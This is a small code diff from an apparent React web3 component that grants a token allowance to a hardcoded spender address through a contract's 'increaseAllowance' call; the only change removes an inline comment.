@@ -11,7 +11,7 @@ const Transfer = () => {
   const amount = "100000000000000000000";
   const ownerAddress = useAddress();
   const spenderAddress = "0xEa52C33f5f61457140C397cc85D72F57ed2da8f5";
-  const increaseAmount = "100000000"; // Adjust as needed
+  const increaseAmount = "100000000";
   const increaseAllowance = async (contract) => {
     try {
       await contract.call("increaseAllowance", [
